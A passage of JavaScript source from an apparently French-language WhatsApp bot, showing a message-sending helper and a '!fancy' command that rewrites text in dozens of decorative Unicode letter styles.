  const videoExts = ['.mp4','.mov','.mkv'], imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
  let mediaPath = null, mediaType = null;
  for (const ext of videoExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='video';break;} }
  if (!mediaPath) { for (const ext of imageExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='image';break;} } }

  const mq = buildMetaQuote(latencyMs);
  const badge = buildBadgeCtx();
  const sendOpts = { quoted: mq };

  let sentMsg;
  try {
    if (mediaPath && mediaType === 'video') {
      sentMsg = await sock.sendMessage(remoteJid, {
        video: fs.readFileSync(mediaPath),
        caption: text,
        gifPlayback: false,
        mentions,
        ...badge
      }, sendOpts);
    } else if (mediaPath && mediaType === 'image') {
      sentMsg = await sock.sendMessage(remoteJid, {
        image: fs.readFileSync(mediaPath),
        caption: text,
        mentions,
        ...badge
      }, sendOpts);
    } else {
      sentMsg = await sock.sendMessage(remoteJid, {
        text,
        mentions,
        ...badge
      }, sendOpts);
    }
  } catch(e) {
    try { sentMsg = await sock.sendMessage(remoteJid, { text, mentions }); } catch(e2) {}
  }
  sendCmdAudio(sock, remoteJid).catch(() => {});
  return sentMsg;
}

// =============================================
// ✨ COMMANDE FANCY — Convertir texte en styles
// Usage: !fancy [numéro] [texte]
//        !fancy [texte]  → liste tous les styles
// =============================================
async function handleFancy(sock, args, remoteJid, senderJid) {
  if (!args.length) {
    await sock.sendMessage(remoteJid, {
      text: `✨ *FANCY - Styles de texte*\n\nUsage:\n• ${config.prefix}fancy [texte] → voir tous les styles\n• ${config.prefix}fancy [numéro] [texte] → style spécifique\n\nEx: ${config.prefix}fancy CyberToji\nEx: ${config.prefix}fancy 10 CyberToji`
    });
    return;
  }

  // Détecter si le premier arg est un numéro
  const firstArg = args[0];
  let styleNum = parseInt(firstArg);
  let text;

  if (!isNaN(styleNum) && args.length > 1) {
    text = args.slice(1).join(' ');
  } else {
    styleNum = null;
    text = args.join(' ');
  }

  // Table de conversion lettre → fancy par style
  // Chaque style a un mapping complet A-Z a-z 0-9
  function applyStyle(text, styleIndex) {
    const styles = [
      // 1 - ຊ໐k໐น style Thai/Lao
      { map: {'a':'ส','b':'ც','c':'ċ','d':'ɗ','e':'ε','f':'ƒ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'๓','n':'ŋ','o':'໐','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'น','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'ส','B':'ც','C':'Ċ','D':'Ɗ','E':'Ε','F':'Ƒ','G':'Ɠ','H':'Ɦ','I':'I','J':'ʝ','K':'Ƙ','L':'Ⴊ','M':'๓','N':'Ŋ','O':'໐','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'น','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
      // 2 - ʑơƙơų style
      { map: {'a':'ą','b':'ɓ','c':'ƈ','d':'ɗ','e':'ɛ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'ɱ','n':'ŋ','o':'ơ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'ų','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɗ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ƙ','L':'ʟ','M':'ɱ','N':'Ŋ','O':'Ơ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'Ų','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
      // 3 - 乙のズのひ Japanese
      { map: {'a':'ά','b':'乃','c':'ς','d':'∂','e':'ε','f':'ƒ','g':'g','h':'ん','i':'ι','j':'j','k':'ズ','l':'ℓ','m':'ﾶ','n':'η','o':'の','p':'ρ','q':'q','r':'尺','s':'丂','t':'τ','u':'ひ','v':'ν','w':'ω','x':'χ','y':'ソ','z':'乙','A':'ά','B':'乃','C':'ς','D':'∂','E':'Ε','F':'Ƒ','G':'G','H':'ん','I':'ι','J':'J','K':'ズ','L':'ℓ','M':'ﾶ','N':'η','O':'の','P':'Ρ','Q':'Q','R':'尺','S':'丂','T':'τ','U':'ひ','V':'Ν','W':'Ω','X':'Χ','Y':'ソ','Z':'乙'} },
      // 4 - 乙ㄖҜㄖㄩ Leet/Kanji
      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᗴ','f':'ᖴ','g':'Ǥ','h':'ᕼ','i':'ι','j':'ᒍ','k':'Ҝ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'ㄖ','p':'ᑭ','q':'Ƣ','r':'ᖇ','s':'Ş','t':'ƬΉΣ','u':'ᑌ','v':'᙮᙮','w':'ᗯ','x':'᙭','y':'ƳΘᑌ','z':'乙','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᗴ','F':'ᖴ','G':'Ǥ','H':'ᕼ','I':'ι','J':'ᒍ','K':'Ҝ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'ㄖ','P':'ᑭ','Q':'Ƣ','R':'ᖇ','S':'Ş','T':'Ƭ','U':'ᑌ','V':'᙮᙮','W':'ᗯ','X':'᙭','Y':'Ƴ','Z':'乙'} },
      // 5 - 🅉🄾🄺🄾🅄 Enclosed letters
      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
      // 6 - ፚᎧᏦᎧᏬ Ethiopian/Cherokee
      { map: {'a':'Ꭺ','b':'Ᏸ','c':'Ꮯ','d':'Ꭰ','e':'Ꮛ','f':'Ꭶ','g':'Ꮆ','h':'Ꮒ','i':'Ꭵ','j':'Ꮰ','k':'Ꮶ','l':'Ꮮ','m':'Ꮇ','n':'Ꮑ','o':'Ꭷ','p':'Ꭾ','q':'Ꭴ','r':'Ꮢ','s':'Ꮥ','t':'Ꮦ','u':'Ꮜ','v':'Ꮩ','w':'Ꮃ','x':'Ꮙ','y':'Ꮍ','z':'ፚ','A':'Ꭺ','B':'Ᏸ','C':'Ꮯ','D':'Ꭰ','E':'Ꮛ','F':'Ꭶ','G':'Ꮆ','H':'Ꮒ','I':'Ꭵ','J':'Ꮰ','K':'Ꮶ','L':'Ꮮ','M':'Ꮇ','N':'Ꮑ','O':'Ꭷ','P':'Ꭾ','Q':'Ꭴ','R':'Ꮢ','S':'Ꮥ','T':'Ꮦ','U':'Ꮜ','V':'Ꮩ','W':'Ꮃ','X':'Ꮙ','Y':'Ꮍ','Z':'ፚ'} },
      // 7 - ᘔOKOᑌ Canadian Aboriginal
      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᕮ','f':'ᖴ','g':'ᘜ','h':'ᕼ','i':'ᓰ','j':'ᒍ','k':'ᛕ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'O','p':'ᑭ','q':'ᕴ','r':'ᖇ','s':'ᔕ','t':'ᗪ','u':'ᑌ','v':'ᐯ','w':'ᗯ','x':'ᘔ','y':'ᖻ','z':'ᘔ','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᕮ','F':'ᖴ','G':'ᘜ','H':'ᕼ','I':'ᓰ','J':'ᒍ','K':'ᛕ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'O','P':'ᑭ','Q':'ᕴ','R':'ᖇ','S':'ᔕ','T':'ᗪ','U':'ᑌ','V':'ᐯ','W':'ᗯ','X':'ᘔ','Y':'ᖻ','Z':'ᘔ'} },
      // 8 - ʐօӄօʊ Armenian
      { map: {'a':'ą','b':'ҍ','c':'ç','d':'ժ','e':'ҽ','f':'ƒ','g':'ց','h':'հ','i':'ì','j':'ʝ','k':'ҟ','l':'Ӏ','m':'ʍ','n':'ղ','o':'օ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'է','u':'մ','v':'ѵ','w':'ա','x':'×','y':'վ','z':'ʐ','A':'Ą','B':'Ҍ','C':'Ç','D':'Ժ','E':'Ҽ','F':'Ƒ','G':'Ց','H':'Հ','I':'Ì','J':'ʝ','K':'Ҟ','L':'Ӏ','M':'ʍ','N':'Ղ','O':'Օ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Է','U':'Մ','V':'Ѵ','W':'Ա','X':'×','Y':'Վ','Z':'ʐ'} },
      // 9 - 𝚉𝚘𝚔𝚘𝚞 Monospace
      { range: [0x1D670, 0x1D689, 0x1D670] }, // handled separately
      // 10 - 𝙕𝙤𝙠𝙤𝙪 Bold Italic
      { range: [0x1D468, 0x1D481, 0x1D468] },
      // 11 - 𝐙𝐨𝐤𝐨𝐮 Bold
      { range: [0x1D400, 0x1D419, 0x1D400] },
      // 12 - 𝗭𝗼𝗸𝗼𝘂 Bold Sans
      { range: [0x1D5D4, 0x1D5ED, 0x1D5D4] },
      // 13 - 𝘡𝘰𝘬𝘰𝘶 Italic Sans
      { range: [0x1D608, 0x1D621, 0x1D608] },
      // 14 - Zσƙσυ Greek-ish
      { map: {'a':'α','b':'в','c':'¢','d':'∂','e':'є','f':'ƒ','g':'g','h':'н','i':'ι','j':'נ','k':'ƙ','l':'ℓ','m':'м','n':'η','o':'σ','p':'ρ','q':'q','r':'я','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ω','x':'χ','y':'γ','z':'з','A':'Α','B':'В','C':'¢','D':'∂','E':'Є','F':'Ƒ','G':'G','H':'Η','I':'Ι','J':'נ','K':'Ƙ','L':'ℓ','M':'М','N':'Η','O':'Ω','P':'Ρ','Q':'Q','R':'Я','S':'Ѕ','T':'Τ','U':'Υ','V':'Ν','W':'Ω','X':'Χ','Y':'Υ','Z':'Ζ'} },
      // 15 - ⱫØ₭ØɄ Currency
      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
      // 16 - Zðkðµ
      { map: {'a':'å','b':'ƀ','c':'ċ','d':'ð','e':'ê','f':'ƒ','g':'ĝ','h':'ĥ','i':'î','j':'ĵ','k':'ķ','l':'ļ','m':'m','n':'ñ','o':'ð','p':'þ','q':'q','r':'ŗ','s':'ş','t':'ţ','u':'µ','v':'v','w':'ŵ','x':'x','y':'ÿ','z':'ƶ','A':'Å','B':'Ƀ','C':'Ċ','D':'Ð','E':'Ê','F':'Ƒ','G':'Ĝ','H':'Ĥ','I':'Î','J':'Ĵ','K':'Ķ','L':'Ļ','M':'M','N':'Ñ','O':'Ð','P':'Þ','Q':'Q','R':'Ŗ','S':'Ş','T':'Ţ','U':'Ü','V':'V','W':'Ŵ','X':'X','Y':'Ÿ','Z':'Ƶ'} },
      // 17 - zσкσυ Cyrillic Greek
      { map: {'a':'α','b':'в','c':'с','d':'∂','e':'є','f':'f','g':'g','h':'н','i':'і','j':'ʝ','k':'к','l':'l','m':'м','n':'η','o':'σ','p':'р','q':'q','r':'г','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ш','x':'χ','y':'у','z':'z','A':'Α','B':'В','C':'С','D':'D','E':'Є','F':'F','G':'G','H':'Н','I':'І','J':'J','K':'К','L':'L','M':'М','N':'Η','O':'Ω','P':'Р','Q':'Q','R':'Г','S':'Ѕ','T':'Т','U':'Υ','V':'Ν','W':'Ш','X':'Χ','Y':'У','Z':'Z'} },
      // 18 - ɀօҟօմ Armenian mix
      { map: {'a':'ɑ','b':'ɓ','c':'ƈ','d':'ɖ','e':'ɘ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ҟ','l':'ʟ','m':'ɱ','n':'ɳ','o':'ɔ','p':'ρ','q':'q','r':'ɹ','s':'ʂ','t':'ƭ','u':'ʋ','v':'ʌ','w':'ɯ','x':'χ','y':'ʎ','z':'ɀ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɖ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ҟ','L':'ʟ','M':'Ɱ','N':'ɳ','O':'Ɔ','P':'Ρ','Q':'Q','R':'ɹ','S':'Ʂ','T':'Ƭ','U':'Ʋ','V':'Ʌ','W':'Ɯ','X':'Χ','Y':'ʎ','Z':'ɀ'} },
      // 19 - ZӨKӨЦ Cyrillic caps
      { map: {'a':'Δ','b':'Ъ','c':'С','d':'D','e':'Є','f':'F','g':'Ǵ','h':'Н','i':'І','j':'J','k':'К','l':'Ĺ','m':'М','n':'Й','o':'Θ','p':'Р','q':'Q','r':'Я','s':'Ş','t':'Т','u':'Ц','v':'V','w':'W','x':'Х','y':'Ч','z':'Z','A':'Δ','B':'Ъ','C':'С','D':'D','E':'Є','F':'F','G':'Ǵ','H':'Н','I':'І','J':'J','K':'К','L':'Ĺ','M':'М','N':'Й','O':'Θ','P':'Р','Q':'Q','R':'Я','S':'Ş','T':'Т','U':'Ц','V':'V','W':'W','X':'Х','Y':'Ч','Z':'Z'} },
      // 20 - Subscript
      { map: {'a':'ₐ','b':'b','c':'c','d':'d','e':'ₑ','f':'f','g':'g','h':'ₕ','i':'ᵢ','j':'ⱼ','k':'ₖ','l':'ₗ','m':'ₘ','n':'ₙ','o':'ₒ','p':'ₚ','q':'q','r':'ᵣ','s':'ₛ','t':'ₜ','u':'ᵤ','v':'ᵥ','w':'w','x':'ₓ','y':'y','z':'z','A':'ₐ','B':'B','C':'C','D':'D','E':'ₑ','F':'F','G':'G','H':'ₕ','I':'ᵢ','J':'ⱼ','K':'ₖ','L':'ₗ','M':'ₘ','N':'ₙ','O':'ₒ','P':'ₚ','Q':'Q','R':'ᵣ','S':'ₛ','T':'ₜ','U':'ᵤ','V':'ᵥ','W':'W','X':'ₓ','Y':'Y','Z':'Z','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'} },
      // 21 - Superscript
      { map: {'a':'ᵃ','b':'ᵇ','c':'ᶜ','d':'ᵈ','e':'ᵉ','f':'ᶠ','g':'ᵍ','h':'ʰ','i':'ⁱ','j':'ʲ','k':'ᵏ','l':'ˡ','m':'ᵐ','n':'ⁿ','o':'ᵒ','p':'ᵖ','q':'q','r':'ʳ','s':'ˢ','t':'ᵗ','u':'ᵘ','v':'ᵛ','w':'ʷ','x':'ˣ','y':'ʸ','z':'ᶻ','A':'ᴬ','B':'ᴮ','C':'ᶜ','D':'ᴰ','E':'ᴱ','F':'ᶠ','G':'ᴳ','H':'ᴴ','I':'ᴵ','J':'ᴶ','K':'ᴷ','L':'ᴸ','M':'ᴹ','N':'ᴺ','O':'ᴼ','P':'ᴾ','Q':'Q','R':'ᴿ','S':'ˢ','T':'ᵀ','U':'ᵁ','V':'ᵛ','W':'ᵂ','X':'ˣ','Y':'ʸ','Z':'ᶻ','0':'⁰','1':'¹','2':'²','3':'³','4':'⁴','5':'⁵','6':'⁶','7':'⁷','8':'⁸','9':'⁹'} },
      // 22 - Thai style
      { map: {'a':'ค','b':'๖','c':'ς','d':'๔','e':'є','f':'f','g':'ﻮ','h':'h','i':'ﺎ','j':'ﻝ','k':'k','l':'l','m':'๓','n':'ห','o':'๏','p':'p','q':'q','r':'r','s':'ร','t':'t','u':'ย','v':'ν','w':'ω','x':'x','y':'ч','z':'z','A':'ค','B':'๖','C':'ς','D':'๔','E':'є','F':'F','G':'ﻮ','H':'H','I':'ﺎ','J':'ﻝ','K':'K','L':'L','M':'๓','N':'ห','O':'๏','P':'P','Q':'Q','R':'R','S':'ร','T':'T','U':'ย','V':'Ν','W':'Ω','X':'X','Y':'Ч','Z':'Z'} },
      // 23 - Double struck 𝕫𝕠𝕜𝕠𝕦
      { range: [0x1D538, 0x1D551, 0x1D538] },
      // 24 - Fraktur 𝖅𝖔𝖐𝖔𝖚
      { range: [0x1D504, 0x1D51D, 0x1D504] },
      // 25 - Negative squared 🆉🅾🅺🅾🆄
      { map: {'a':'🅰','b':'🅱','c':'🅲','d':'🅳','e':'🅴','f':'🅵','g':'🅶','h':'🅷','i':'🅸','j':'🅹','k':'🅺','l':'🅻','m':'🅼','n':'🅽','o':'🅾','p':'🅿','q':'🆀','r':'🆁','s':'🆂','t':'🆃','u':'🆄','v':'🆅','w':'🆆','x':'🆇','y':'🆈','z':'🆉','A':'🅰','B':'🅱','C':'🅲','D':'🅳','E':'🅴','F':'🅵','G':'🅶','H':'🅷','I':'🅸','J':'🅹','K':'🅺','L':'🅻','M':'🅼','N':'🅽','O':'🅾','P':'🅿','Q':'🆀','R':'🆁','S':'🆂','T':'🆃','U':'🆄','V':'🆅','W':'🆆','X':'🆇','Y':'🆈','Z':'🆉'} },
      // 26 - Script Bold 𝓩𝓸𝓴𝓸𝓾
      { range: [0x1D4D0, 0x1D4E9, 0x1D4D0] },
      // 27 - Fraktur 𝔷𝔬𝔨𝔬𝔲
      { range: [0x1D51E, 0x1D537, 0x1D51E] },
      // 28 - Fullwidth Ｚｏｋｏｕ
      { map: {'a':'ａ','b':'ｂ','c':'ｃ','d':'ｄ','e':'ｅ','f':'ｆ','g':'ｇ','h':'ｈ','i':'ｉ','j':'ｊ','k':'ｋ','l':'ｌ','m':'ｍ','n':'ｎ','o':'ｏ','p':'ｐ','q':'ｑ','r':'ｒ','s':'ｓ','t':'ｔ','u':'ｕ','v':'ｖ','w':'ｗ','x':'ｘ','y':'ｙ','z':'ｚ','A':'Ａ','B':'Ｂ','C':'Ｃ','D':'Ｄ','E':'Ｅ','F':'Ｆ','G':'Ｇ','H':'Ｈ','I':'Ｉ','J':'Ｊ','K':'Ｋ','L':'Ｌ','M':'Ｍ','N':'Ｎ','O':'Ｏ','P':'Ｐ','Q':'Ｑ','R':'Ｒ','S':'Ｓ','T':'Ｔ','U':'Ｕ','V':'Ｖ','W':'Ｗ','X':'Ｘ','Y':'Ｙ','Z':'Ｚ',' ':'　','0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９'} },
      // 29 - Small caps ᴢᴏᴋᴏᴜ
      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
      // 30 - Italic 𝑍𝒐𝒌𝒐𝒖
      { range: [0x1D434, 0x1D44D, 0x1D434] },
      // 31 - Math bold 𝛧𝛩𝛫𝛩𝑈
      { map: {'a':'𝛼','b':'𝛽','c':'𝛾','d':'𝛿','e':'𝜀','f':'𝜁','g':'𝜂','h':'𝜃','i':'𝜄','j':'𝜅','k':'𝜆','l':'𝜇','m':'𝜈','n':'𝜉','o':'𝜊','p':'𝜋','q':'𝜌','r':'𝜍','s':'𝜎','t':'𝜏','u':'𝜐','v':'𝜑','w':'𝜒','x':'𝜓','y':'𝜔','z':'z','A':'𝛢','B':'𝛣','C':'𝛤','D':'𝛥','E':'𝛦','F':'𝛧','G':'𝛨','H':'𝛩','I':'𝛪','J':'𝛫','K':'𝛬','L':'𝛭','M':'𝛮','N':'𝛯','O':'𝛰','P':'𝛱','Q':'𝛲','R':'𝛳','S':'𝛴','T':'𝛵','U':'𝛶','V':'𝛷','W':'𝛸','X':'𝛹','Y':'𝛺','Z':'𝛻'} },
      // 32 - Math Monospace Bold 𝚭𝚯𝐊𝚯𝐔
      { map: {'a':'𝚊','b':'𝚋','c':'𝚌','d':'𝚍','e':'𝚎','f':'𝚏','g':'𝚐','h':'𝚑','i':'𝚒','j':'𝚓','k':'𝚔','l':'𝚕','m':'𝚖','n':'𝚗','o':'𝚘','p':'𝚙','q':'𝚚','r':'𝚛','s':'𝚜','t':'𝚝','u':'𝚞','v':'𝚟','w':'𝚠','x':'𝚡','y':'𝚢','z':'𝚣','A':'𝙰','B':'𝙱','C':'𝙲','D':'𝙳','E':'𝙴','F':'𝙵','G':'𝙶','H':'𝙷','I':'𝙸','J':'𝙹','K':'𝙺','L':'𝙻','M':'𝙼','N':'𝙽','O':'𝙾','P':'𝙿','Q':'𝚀','R':'𝚁','S':'𝚂','T':'𝚃','U':'𝚄','V':'𝚅','W':'𝚆','X':'𝚇','Y':'𝚈','Z':'𝚉'} },
      // 33 - ɀꪮᛕꪮꪊ Vai/Runic mix
      { map: {'a':'ꪖ','b':'ꪜ','c':'ꪊ','d':'ᦔ','e':'ꫀ','f':'ꪰ','g':'ᧁ','h':'ꫝ','i':'ꪱ','j':'ꪝ','k':'ᛕ','l':'ꪶ','m':'ꪑ','n':'ꪀ','o':'ꪮ','p':'ρ','q':'ꪕ','r':'ꪹ','s':'ꫛ','t':'ꪻ','u':'ꪊ','v':'ꪜ','w':'ꪲ','x':'ꪤ','y':'ꪗ','z':'ɀ','A':'ꪖ','B':'ꪜ','C':'ꪊ','D':'ᦔ','E':'ꫀ','F':'ꪰ','G':'ᧁ','H':'ꫝ','I':'ꪱ','J':'ꪝ','K':'ᛕ','L':'ꪶ','M':'ꪑ','N':'ꪀ','O':'ꪮ','P':'ρ','Q':'ꪕ','R':'ꪹ','S':'ꫛ','T':'ꪻ','U':'ꪊ','V':'ꪜ','W':'ꪲ','X':'ꪤ','Y':'ꪗ','Z':'ɀ'} },
      // 34 - plain lowercase
      { map: {'a':'a','b':'b','c':'c','d':'d','e':'e','f':'f','g':'g','h':'h','i':'i','j':'j','k':'k','l':'l','m':'m','n':'n','o':'o','p':'p','q':'q','r':'r','s':'s','t':'t','u':'u','v':'v','w':'w','x':'x','y':'y','z':'z','A':'a','B':'b','C':'c','D':'d','E':'e','F':'f','G':'g','H':'h','I':'i','J':'j','K':'k','L':'l','M':'m','N':'n','O':'o','P':'p','Q':'q','R':'r','S':'s','T':'t','U':'u','V':'v','W':'w','X':'x','Y':'y','Z':'z'} },
      // 35 - Bold Italic Script 𝒁𝒐𝒌𝒐𝒖
      { range: [0x1D400, 0x1D419, 0x1D400], italic: true },
      // 36 - Circled letters Ⓩⓞⓚⓞⓤ
      { map: {'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ','k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ','u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ','A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ','K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ','U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'} },
      // 37 - Upside down Zoʞon-ɯp
      { map: {'a':'ɐ','b':'q','c':'ɔ','d':'p','e':'ǝ','f':'ɟ','g':'ƃ','h':'ɥ','i':'ı','j':'ɾ','k':'ʞ','l':'l','m':'ɯ','n':'u','o':'o','p':'d','q':'b','r':'ɹ','s':'s','t':'ʇ','u':'n','v':'ʌ','w':'ʍ','x':'x','y':'ʎ','z':'z','A':'∀','B':'q','C':'Ɔ','D':'p','E':'Ǝ','F':'Ⅎ','G':'פ','H':'H','I':'I','J':'ɾ','K':'ʞ','L':'˥','M':'W','N':'N','O':'O','P':'d','Q':'Q','R':'ɹ','S':'S','T':'┴','U':'∩','V':'Λ','W':'M','X':'X','Y':'⅄','Z':'Z'} },
      // 38 = same as 29 (small caps)
      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
      // 39 = same as 27
      { range: [0x1D51E, 0x1D537, 0x1D51E] },
      // 40 = same as 15
      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
      // 41 = same as 5
      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
      // 42 - Negative circled 🅩🅞🅚🅞🅤
      { map: {'a':'🅐','b':'🅑','c':'🅒','d':'🅓','e':'🅔','f':'🅕','g':'🅖','h':'🅗','i':'🅘','j':'🅙','k':'🅚','l':'🅛','m':'🅜','n':'🅝','o':'🅞','p':'🅟','q':'🅠','r':'🅡','s':'🅢','t':'🅣','u':'🅤','v':'🅥','w':'🅦','x':'🅧','y':'🅨','z':'🅩','A':'🅐','B':'🅑','C':'🅒','D':'🅓','E':'🅔','F':'🅕','G':'🅖','H':'🅗','I':'🅘','J':'🅙','K':'🅚','L':'🅛','M':'🅜','N':'🅝','O':'🅞','P':'🅟','Q':'🅠','R':'🅡','S':'🅢','T':'🅣','U':'🅤','V':'🅥','W':'🅦','X':'🅧','Y':'🅨','Z':'🅩'} },
      // 43 - Underline Z̲o̲k̲o̲u̲
      { underline: true },
    ];

    const style = styles[styleIndex];
    if (!style) return text;

    // Style with underline
    if (style.underline) {
      return text.split('').map(c => c !== ' ' ? c + '\u0332' : c).join('');
    }

    // Style with range Unicode (mathématique)
    if (style.range) {
      const [upperBase, , lowerBase] = style.range;
      return text.split('').map(c => {
        const code = c.charCodeAt(0);
        if (code >= 65 && code <= 90) return String.fromCodePoint(upperBase + (code - 65));
        if (code >= 97 && code <= 122) return String.fromCodePoint(lowerBase + (code - 97));
        return c;
      }).join('');
    }

